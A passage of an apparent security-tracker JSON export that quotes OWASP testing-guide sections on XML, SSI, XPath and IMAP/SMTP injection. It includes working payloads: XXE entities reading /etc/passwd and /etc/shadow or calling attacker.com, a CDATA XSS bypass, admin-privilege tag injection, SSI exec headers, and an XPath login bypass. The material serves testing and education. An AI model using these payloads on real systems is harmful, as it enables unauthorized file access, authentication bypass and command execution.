\u0060\u0026foo;\u0060 entity is undefined.\n\n* CDATA section delimiters: \u0060\u003C!\\[CDATA\\[ / ]]\u003E\u0060 \\- CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup\\. In other words\\, characters enclosed in a CDATA section are not parsed by an XML parser\\.\n\nFor example, if there is the need to represent the string \u0060\u003Cfoo\u003E\u0060 inside a text node, a CDATA section may be used:\n\n\u0060\u0060\u0060\n\u003Cnode\u003E\n    \u003C![CDATA[\u003Cfoo\u003E]]\u003E\n\u003C/node\u003E\n\u0060\u0060\u0060\n\nso that \u0060\u003Cfoo\u003E\u0060 won\u2019t be parsed as markup and will be considered as character data.\nIf a node is created in the following way:\n\u0060\u003Cusername\u003E\u003C![CDATA[\u003C$userName]]\u003E\u003C/username\u003E\u0060\nthe tester could try to inject the end CDATA string \u0060]]\u003E\u0060 in order to try to invalidate the XML document.\n\u0060userName = ]]\u003E\u0060\nthis will become:\n\u0060\u003Cusername\u003E\u003C![CDATA[]]\u003E]]\u003E\u003C/username\u003E\u0060\nwhich is not a valid XML fragment.\nAnother test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.\nLet\u2019s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n    $HTMLCode\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nThen, an attacker can provide the following input:\n\u0060$HTMLCode = \u003C![CDATA[\u003C]]\u003Escript\u003C![CDATA[\u003E]]\u003Ealert(\u0027xss\u0027)\u003C![CDATA[\u003C]]\u003E/script\u003C![CDATA[\u003E]]\u003E\u0060\nand obtain the following node:\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n    \u003C![CDATA[\u003C]]\u003Escript\u003C![CDATA[\u003E]]\u003Ealert(\u0027xss\u0027)\u003C![CDATA[\u003C]]\u003E/script\u003C![CDATA[\u003E]]\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nDuring the processing, the CDATA section delimiters are eliminated, generating the following HTML code:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\n    alert(\u0027XSS\u0027)\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nThe result is that the application is vulnerable to XSS.\nExternal Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.\nTo test for XXE vulnerabilities, one can use the following input:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n    \u003C!DOCTYPE foo [ \u003C!ELEMENT foo ANY \u003E\n        \u003C!ENTITY xxe SYSTEM \u0022file:///dev/random\u0022 \u003E]\u003E\n        \u003Cfoo\u003E\u0026xxe;\u003C/foo\u003E\n\u0060\u0060\u0060\n\nThis test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.\nOther useful tests are the following:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n    \u003C!DOCTYPE foo [ \u003C!ELEMENT foo ANY \u003E\n        \u003C!ENTITY xxe SYSTEM \u0022file:///etc/passwd\u0022 \u003E]\u003E\u003Cfoo\u003E\u0026xxe;\u003C/foo\u003E\n\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n    \u003C!DOCTYPE foo [ \u003C!ELEMENT foo ANY \u003E\n        \u003C!ENTITY xxe SYSTEM \u0022file:///etc/shadow\u0022 \u003E]\u003E\u003Cfoo\u003E\u0026xxe;\u003C/foo\u003E\n\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n    \u003C!DOCTYPE foo [ \u003C!ELEMENT foo ANY \u003E\n        \u003C!ENTITY xxe SYSTEM \u0022file:///c:/boot.ini\u0022 \u003E]\u003E\u003Cfoo\u003E\u0026xxe;\u003C/foo\u003E\n\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n    \u003C!DOCTYPE foo [ \u003C!ELEMENT foo ANY \u003E\n        \u003C!ENTITY xxe SYSTEM \u0022http://www.attacker.com/text.txt\u0022 \u003E]\u003E\u003Cfoo\u003E\u0026xxe;\u003C/foo\u003E\n\u0060\u0060\u0060\n\n### Tag Injection\n\nOnce the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.\nLet\u2019s considering the previous application. By inserting the following values:\n\n\u0060\u0060\u0060\nUsername: tony\nPassword: Un6R34kb!e\nE-mail: s4tan@hell.com\u003C/mail\u003E\u003Cuserid\u003E0\u003C/userid\u003E\u003Cmail\u003Es4tan@hell.com\n\u0060\u0060\u0060\n\nthe application will build a new node and append it to the XML database:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n\u003Cusers\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Egandalf\u003C/username\u003E\n        \u003Cpassword\u003E!c3\u003C/password\u003E\n        \u003Cuserid\u003E0\u003C/userid\u003E\n        \u003Cmail\u003Egandalf@middleearth.com\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003EStefan0\u003C/username\u003E\n        \u003Cpassword\u003Ew1s3c\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003EStefan0@whysec.hmm\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Etony\u003C/username\u003E\n        \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n        \u003Cuserid\u003E0\u003C/userid\u003E\n        \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n    \u003C/user\u003E\n\u003C/users\u003E\n\u0060\u0060\u0060\n\nThe resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.\nThe only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don\u2019t comply with it.\nLet\u2019s suppose that the XML document is specified by the following DTD:\n\n\u0060\u0060\u0060\n\u003C!DOCTYPE users [\n    \u003C!ELEMENT users (user\u002B) \u003E\n    \u003C!ELEMENT user (username,password,userid,mail\u002B) \u003E\n    \u003C!ELEMENT username (#PCDATA) \u003E\n    \u003C!ELEMENT password (#PCDATA) \u003E\n    \u003C!ELEMENT userid (#PCDATA) \u003E\n    \u003C!ELEMENT mail (#PCDATA) \u003E\n]\u003E\n\u0060\u0060\u0060\n\nNote that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.\nHowever, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:\n\n\u0060\u0060\u0060\nUsername: tony\nPassword: Un6R34kb!e\u003C/password\u003E\u003C!--\nE-mail: --\u003E\u003Cuserid\u003E0\u003C/userid\u003E\u003Cmail\u003Es4tan@hell.com\n\u0060\u0060\u0060\n\nIn this case, the final XML database is:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n\u003Cusers\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Egandalf\u003C/username\u003E\n        \u003Cpassword\u003E!c3\u003C/password\u003E\n        \u003Cuserid\u003E0\u003C/userid\u003E\n        \u003Cmail\u003Egandalf@middleearth.com\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003EStefan0\u003C/username\u003E\n        \u003Cpassword\u003Ew1s3c\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003EStefan0@whysec.hmm\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Etony\u003C/username\u003E\n        \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\u003C!--\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003E--\u003E\u003Cuserid\u003E0\u003C/userid\u003E\u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n    \u003C/user\u003E\n\u003C/users\u003E\n\u0060\u0060\u0060\n\nThe original \u0060userid\u0060 node has been commented out, leaving only the injected one. The document now complies with its DTD rules.\n\n## Source Code Review\n\nThe following Java API may be vulnerable to XXE if they are not configured properly.\n\n\u0060\u0060\u0060\njavax.xml.parsers.DocumentBuilder\njavax.xml.parsers.DocumentBuildFactory\norg.xml.sax.EntityResolver\norg.dom4j.*\njavax.xml.parsers.SAXParser\njavax.xml.parsers.SAXParserFactory\nTransformerFactory\nSAXReader\nDocumentHelper\nSAXBuilder\nSAXParserFactory\nXMLReaderFactory\nXMLInputFactory\nSchemaFactory\nDocumentBuilderFactoryImpl\nSAXTransformerFactory\nDocumentBuilderFactoryImpl\nXMLReader\nXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser\n\u0060\u0060\u0060\n\nCheck source code if the docType, external DTD, and external parameter entities are set as forbidden uses.\n\n* [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)\n\nIn addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.\nThe version of POI library can be identified from the filename of the JAR. For example,\n\n* \u0060poi-3.8.jar\u0060\n* \u0060poi-ooxml-3.8.jar\u0060\n\nThe followings source code keyword may apply to C.\n\n* libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO\n* libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader\n\n## Tools\n\n* [XML Injection Fuzz Strings (from wfuzz tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)","Details":null,"Implication":null,"Recommendation":null,"References":"* [XML Injection](https://www.whitehatsec.com/glossary/content/xml-injection)\n* [Gregory Steuck, \u201CXXE (Xml eXternal Entity) attack\u201D](https://www.securityfocus.com/archive/1/297714)\n* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-08 Testing for SSI Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWeb servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages. This feature is provided by [Server-Side Includes](https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection)(SSI).\nServer-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages, when there\u2019s only need to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to set and print web server CGI environment variables, or to execute external CGI scripts or system commands.\nSSI can lead to a Remote Command Execution (RCE), however most webservers have the \u0060exec\u0060 directive disabled by default.\nThis is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit, since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of files and execute system commands.","TestingInstructions":"## Test Objectives\n\n* Identify SSI injection points.\n* Assess the severity of the injection.\n\n## How to Test\n\nTo test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive. This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.\nFirst determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see [Fingerprint Web Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server)). If you have access to the code, determine if SSI directives are used by searching through the webserver configuration files for specific keywords.\nAnother way of verifying that SSI directives are enabled is by checking for pages with the \u0060.shtml\u0060 extension, which is associated with SSI directives. The use of the \u0060.shtml\u0060 extension is not mandatory, so not having found any \u0060.shtml\u0060 files doesn\u2019t necessarily mean that the target is not vulnerable to SSI injection attacks.\nThe next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.\nFirst find all the pages where user input is allowed. Possible input vectors may also include headers and cookies. Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it was modified in some way. Access to the source code can help you to more easily determine where the input vectors are and how input is handled.\nOnce you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is possible to inject characters used in SSI directives such as \u0060\u003C!#=/.\u0022-\u003E\u0060 and \u0060[a-zA-Z0-9]\u0060\nThe below example returns the value of the variable. The [references](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection#references) section has helpful links with server-specific documentation to help you better assess a particular system.\n\n\u0060\u0060\u0060\n\u003C!--#echo var=\u0022VAR\u0022 --\u003E\n\u0060\u0060\u0060\n\nWhen using the \u0060include\u0060 directive, if the supplied file is a CGI script, this directive will include the output of the CGI script. This directive may also be used to include the content of a file or list files in a directory:\n\n\u0060\u0060\u0060\n\u003C!--#include virtual=\u0022FILENAME\u0022 --\u003E\n\u0060\u0060\u0060\n\nTo return the output of a system command:\n\n\u0060\u0060\u0060\n\u003C!--#exec cmd=\u0022OS_COMMAND\u0022 --\u003E\n\u0060\u0060\u0060\n\nIf the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page is served.\nThe SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.example.com\nReferer: \u003C!--#exec cmd=\u0022/bin/ps ax\u0022--\u003E\nUser-Agent: \u003C!--#include virtual=\u0022/proc/version\u0022--\u003E\n\u0060\u0060\u0060\n\n## Tools\n\n* [Web Proxy Burp Suite](https://portswigger.net/burp/communitydownload)\n* [ZAP](https://www.zaproxy.org/)\n* [String searcher: grep](https://www.gnu.org/software/grep)","Details":null,"Implication":null,"Recommendation":null,"References":"* [Nginx SSI module](http://nginx.org/en/docs/http/ngx_http_ssi_module.html)\n* [Apache: Module mod_include](https://httpd.apache.org/docs/current/mod/mod_include.html)\n* [IIS: Server-Side Includes directives](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525185%28v=vs.90%29)\n* [Apache Tutorial: Introduction to Server-Side Includes](https://httpd.apache.org/docs/current/howto/ssi.html)\n* [Apache: Security Tips for Server Configuration](https://httpd.apache.org/docs/current/misc/security_tips.html#ssi)\n* [SSI Injection instead of JavaScript Malware](https://jeremiahgrossman.blogspot.com/2006/08/ssi-injection-instead-of-javascript.html)\n* [IIS: Notes on Server-Side Includes (SSI) syntax](https://blogs.iis.net/robert_mcmurray/archive/2010/12/28/iis-notes-on-server-side-includes-ssi-syntax-kb-203064-revisited.aspx)\n* [Header Based Exploitation](https://www.cgisecurity.com/papers/header-based-exploitation.txt)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-09 Testing for XPath Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nXPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker to bypass authentication mechanisms or access information without proper authorization.\nWeb applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but, in the last years, we are witnessing an increasing popularity for databases that organize data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language.\nSince, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) attacks. In some aspects, XPath is even more powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of the XML document.","TestingInstructions":"## Test Objectives\n\n* Identify XPATH injection points.\n\n## How to Test\n\nThe [XPath attack pattern was first published by Amit Klein](http://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf) and is very similar to the usual SQL Injection. In order to get a first grasp of the problem, let\u2019s imagine a login page that manages the authentication to an application in which the user must enter their username and password. Let\u2019s assume that our database is represented by the following XML file:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n\u003Cusers\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Egandalf\u003C/username\u003E\n        \u003Cpassword\u003E!c3\u003C/password\u003E\n        \u003Caccount\u003Eadmin\u003C/account\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003EStefan0\u003C/username\u003E\n        \u003Cpassword\u003Ew1s3c\u003C/password\u003E\n        \u003Caccount\u003Eguest\u003C/account\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Etony\u003C/username\u003E\n        \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n        \u003Caccount\u003Eguest\u003C/account\u003E\n    \u003C/user\u003E\n\u003C/users\u003E\n\u0060\u0060\u0060\n\nAn XPath query that returns the account whose username is \u0060gandalf\u0060 and the password is \u0060!c3\u0060 would be the following:\n\u0060string(//user[username/text()=\u0027gandalf\u0027 and password/text()=\u0027!c3\u0027]/account/text())\u0060\nIf the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:\n\n\u0060\u0060\u0060\nUsername: \u0027 or \u00271\u0027 = \u00271\nPassword: \u0027 or \u00271\u0027 = \u00271\n\u0060\u0060\u0060\n\nLooks quite familiar, doesn\u2019t it? Using these parameters, the query becomes:\n\u0060string(//user[username/text()=\u0027\u0027 or \u00271\u0027 = \u00271\u0027 and password/text()=\u0027\u0027 or \u00271\u0027 = \u00271\u0027]/account/text())\u0060\nAs in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided. And as in a common SQL Injection attack, with XPath injection, the first step is to insert a single quote (\u0060\u0027\u0060) in the field to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.\nIf there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection) attack, whose goal is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information. [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection) is explained in more detail by Amit Klein in the referenced paper.","Details":null,"Implication":null,"Recommendation":null,"References":"* [Amit Klein: \u201CBlind XPath Injection\u201D](http://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf)\n* [XPath 1.0 specifications](https://www.w3.org/TR/1999/REC-xpath-19991116/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-10 Testing for IMAP SMTP Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.\nThe IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.\nAn IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks by end users (see the scheme presented in Figure 1).\n![IMAP SMTP Injection](Image Not Found)\n*Figure 4.7.10-1: Communication with the mail servers using the IMAP/SMTP Injection technique*\nFigure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end mail servers directly.\nThis technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection and the mail server technology being tested.\nSome examples of attacks using the IMAP/SMTP Injection technique are:\n\n* Exploitation of vulnerabilities in the IMAP/SMTP protocol\n* Application restrictions evasion\n* Anti-automation process evasion\n* Information leaks\n* Relay/SPAM","TestingInstructions":"## Test Objectives\n\n* Identify IMAP/SMTP injection points.\n* Understand the data flow and deployment structure of the system.\n* Assess the injection impacts.\n\n## How to Test\n\n### Identifying Vulnerable Parameters\n\nIn order to detect vulnerable parameters, the tester has to analyze the application\u2019s ability in handling input. Input validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a secure application, the response should be an error with some corresponding action telling the client that something has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that will answer with a \u0060HTTP 200 OK\u0060 response message.\nIt is important to note that the requests being sent should match the technology being tested. Sending SQL injection strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case, sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.\nIMAP special parameters that should be used are:\n\n| On the IMAP server | On the SMTP server |\n| ------------------ | ------------------ |\n| Authentication | Emissor email |\n| operations with mail boxes (list, read, create, delete, rename) | Destination email |\n| operations with messages (read, copy, move, delete) | Subject |\n| Disconnection | Message body |\n| \u00A0 | Attached files |\n\nIn this example, the \u201Cmailbox\u201D parameter is being tested by manipulating all requests with the parameter in:\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=INBOX\u0026passed_id=46106\u0026startMessage=1\u0060\nThe following examples can be used.\n\n* Assign a null value to the parameter:\n\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=\u0026passed_id=46106\u0026startMessage=1\u0060\n\n* Substitute the value with a random value:\n\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=NOTEXIST\u0026passed_id=46106\u0026startMessage=1\u0060\n\n* Add other values to the parameter:\n\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=INBOX PARAMETER2\u0026passed_id=46106\u0026startMessage=1\u0060\n\n* Add non-standard special characters (i.e.: \u0060\\\u0060, \u0060\u0027\u0060, \u0060\u0022\u0060, \u0060@\u0060, \u0060#\u0060, \u0060!\u0060, \u0060|\u0060):\n\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=INBOX\u0022\u0026passed_id=46106\u0026startMessage=1\u0060\n\n* Eliminate the parameter:\n\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?passed_id=46106\u0026startMessage=1\u0060\nThe final result of the above testing gives the tester three possible situations: S1 - The application returns a error code/message S2 - The application does not return an error code/message, but it does not realize the requested operation S3 - The application does not return an error code/message and realizes the operation requested normally\nSituations S1 and S2 represent successful IMAP/SMTP injection.\nAn attacker\u2019s aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and further manipulation.\nLet\u2019s suppose that a user retrieves the email headers using the following HTTP request:\n\u0060http://\u003Cwebmail\u003E/src/view_header.php?mailbox=INBOX\u0026passed_id=46105\u0026passed_ent_id=0\u0060\nAn attacker might modify the value of the parameter INBOX by injecting the character \u0060\u0022\u0060 (%22 using URL encoding):\n\u0060http://\u003Cwebmail\u003E/src/view_header.php?mailbox=INBOX%22\u0026passed_id=46105\u0026passed_ent_id=0\u0060\nIn this case, the application answer may be:\n\n\u0060\u0060\u0060\nERROR: Bad or malformed request.\nQuery: SELECT \u0022INBOX\u0022\u0022\nServer responded: Unexpected extra arguments to Select\n\u0060\u0060\u0060\n\nThe situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if the server is vulnerable.\nOn the other hand, the last situation (S3) is not relevant in this paragraph.\n\n\u003E List of vulnerable parameters\n\u003E\n\u003E * Affected functionality\n\u003E * Type of possible injection (IMAP/SMTP)\n\n### Understanding the Data Flow and Deployment Structure of the Client\n\nAfter identifying all vulnerable parameters (for example, \u0060passed_id\u0060), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.\nIn this test case, we have detected that the application\u2019s \u0060passed_id\u0060 parameter is vulnerable and is used in the following request:\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=INBOX\u0026passed_id=46225\u0026startMessage=1\u0060\nUsing the following test case (providing an alphabetical value when a numerical value is required):\n\u0060http://\u003Cwebmail\u003E/src/read_body.php?mailbox=INBOX\u0026passed_id=test\u0026startMessage=1\u0060\nwill generate the following error message:\n\n\u0060\u0060\u0060\nERROR : Bad or malformed request.\nQuery: FETCH test:test BODY[HEADER]\nServer responded: Error in IMAP command received by server.\n\u0060\u0060\u0060\n\nIn this example, the error message returned the name of the executed command and the corresponding parameters.\nIn other situations, the error message (\u0060not controlled\u0060 by the application) contains the name of the executed command, but reading the suitable 